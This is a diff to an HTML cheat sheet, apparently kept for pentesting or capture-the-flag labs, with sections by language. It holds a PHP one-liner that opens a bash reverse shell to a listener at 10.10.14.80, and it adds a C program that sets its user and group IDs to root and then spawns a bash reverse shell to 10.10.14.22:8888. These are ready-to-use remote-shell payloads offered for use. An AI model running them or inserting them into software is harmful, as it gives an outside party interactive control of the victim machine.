@@ -187,10 +187,6 @@
                         <pre><code class="language-php">&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.80/1234 0&gt;&amp;1'&quot;); ?&gt;</code></pre>
                     </ul>
                 </div>
-                
-
-                
-
             <div class="notion-header">
                 <h1 id="Python">Python</h1>
             </div>
@@ -227,7 +223,22 @@
                 file.write(data)
         print('Archivo recibido con éxito y guardado como archivo_recibido.txt.')"</code></pre>
                 </div>
+            
+            <div class="notion-header"> 
+                <h1 id="C">C</h1>
+            </div>
 
+            <div class="notion-body">
+                <ul>
+                    <h2>Reverse shell with C</h2>
+                    <pre><code class="language-c">#include <unistd.h>
+int main() {
+    setuid(0); setgid(0);
+    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.22/8888 0>&1", NULL);
+    return 0;
+}
+</code></pre>    
+                
             <div class="notion-header"> 
                 <h1 id="Netcat">Netcat</h1>
             </div>
@@ -270,7 +281,12 @@
                     <pre><code class="language-bash">sudo timedatectl set-ntp true</code></pre>
                     
                 </ul>
-            </div>   
+            </div>
+            
+            
+                    
+                </ul>
+            </div>
     </div>
 
     <!-- Mover el script al final del body para asegurar que todo el DOM esté cargado -->
